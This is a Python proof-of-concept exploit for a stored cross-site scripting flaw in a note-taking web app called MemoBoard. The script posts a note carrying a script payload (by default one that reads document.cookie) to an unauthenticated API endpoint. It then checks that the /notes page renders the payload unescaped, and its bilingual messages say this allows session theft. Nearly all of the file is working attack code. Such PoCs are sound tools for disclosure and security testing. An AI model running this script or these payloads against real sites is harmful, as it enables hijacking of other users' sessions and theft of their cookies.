#!/usr/bin/env python3
"""PoC: MemoBoard stored XSS via POST /api/notes body rendered with | safe.

1. Create a note with XSS payload in body (no auth required)
2. Fetch /notes page and verify the payload is rendered unescaped
"""
import argparse
import json
import os
import ssl
import urllib.error
import urllib.request

MSGS = {
    "ssl_warn": (
        "[!] Warning: HTTPS target skips TLS certificate verification by default "
        "(common for IP access or self-signed certs); pass --strict-ssl for strict verification",
        "[!] 警告：HTTPS 目标默认跳过 TLS 证书校验（常见于 IP 访问或自签证书）；传入 --strict-ssl 可恢复严格校验",
    ),
    "step1": ("Step 1: Creating note with XSS payload...", "步骤 1：创建含 XSS 载荷的备忘录..."),
    "create_resp": ("Create note response:", "创建备忘录响应:"),
    "create_fail": ("Failed to create note.", "创建备忘录失败。"),
    "step2": (
        "Step 2: Fetching /notes page to verify XSS payload is rendered...",
        "步骤 2：拉取 /notes 页面以确认 XSS 载荷被原样渲染...",
    ),
    "status": ("Status:", "状态:"),
    "page_len": ("Page length:", "页面长度:"),
    "ok": (
        "SUCCESS: XSS payload found unescaped in /notes page HTML.",
        "成功：/notes 页面 HTML 中存在未转义的 XSS 载荷。",
    ),
    "payload": ("Payload rendered:", "渲染出的载荷:"),
    "impact": (
        "The <script> tag will execute in other users' browsers, enabling session theft.",
        "<script> 标签会在其他用户浏览器中执行，可窃取会话。",
    ),
    "context": ("Context around payload:", "载荷附近上下文:"),
    "miss": ("XSS payload not found unescaped in page.", "页面中未找到未转义的 XSS 载荷。"),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def never_bypass(host, **kwargs):
    return False


def ssl_context(*, strict: bool) -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    if strict:
        return ctx
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def opener(proxy: str, *, strict_ssl: bool):
    handlers = [urllib.request.HTTPSHandler(context=ssl_context(strict=strict_ssl))]
    if proxy:
        os.environ["no_proxy"] = ""
        os.environ["NO_PROXY"] = ""
        urllib.request.proxy_bypass = never_bypass
        if hasattr(urllib.request, "proxy_bypass_environment"):
            urllib.request.proxy_bypass_environment = never_bypass
        if hasattr(urllib.request, "proxy_bypass_registry"):
            urllib.request.proxy_bypass_registry = never_bypass
        handlers.insert(0, urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    return urllib.request.build_opener(*handlers)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard Stored XSS PoC")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument(
        "--strict-ssl",
        action="store_true",
        help="Strict HTTPS certificate verification (default: skip mismatch/self-signed)",
    )
    p.add_argument("--zh", action="store_true", help="Print labels/status in Chinese (default: English)")
    p.add_argument(
        "--payload",
        default="<script>alert(document.cookie)</script>",
        help="XSS payload for note body",
    )
    args = p.parse_args()
    zh = args.zh

    base = args.url.rstrip("/")
    if base.lower().startswith("https://") and not args.strict_ssl:
        print(msg("ssl_warn", zh))
    http = opener(args.proxy, strict_ssl=args.strict_ssl)

    print(msg("step1", zh))
    note_data = json.dumps(
        {"title": "xss-test", "body": args.payload, "author": "attacker"}
    ).encode("utf-8")
    create_req = urllib.request.Request(
        f"{base}/api/notes",
        data=note_data,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        resp = http.open(create_req, timeout=15)
        create_body = resp.read().decode("utf-8", errors="replace")
        print(msg("create_resp", zh), resp.status, create_body)
        if resp.status != 201:
            print(msg("create_fail", zh))
            return 1
    except urllib.error.HTTPError as e:
        print(msg("create_fail", zh), f"HTTP {e.code}")
        return 1

    print(msg("step2", zh))
    notes_req = urllib.request.Request(f"{base}/notes", headers={"Accept": "text/html"})
    try:
        resp = http.open(notes_req, timeout=15)
        status = resp.status
        page = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        page = e.read().decode("utf-8", errors="replace")

    print(msg("status", zh), status)
    print(msg("page_len", zh), f"{len(page)} bytes")

    if args.payload in page:
        print(f"\n{msg('ok', zh)}")
        print(msg("payload", zh), args.payload)
        print(msg("impact", zh))
        idx = page.find(args.payload)
        start = max(0, idx - 100)
        end = min(len(page), idx + len(args.payload) + 100)
        print(f"\n{msg('context', zh)}")
        print(page[start:end])
        return 0
    print(f"\n{msg('miss', zh)}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
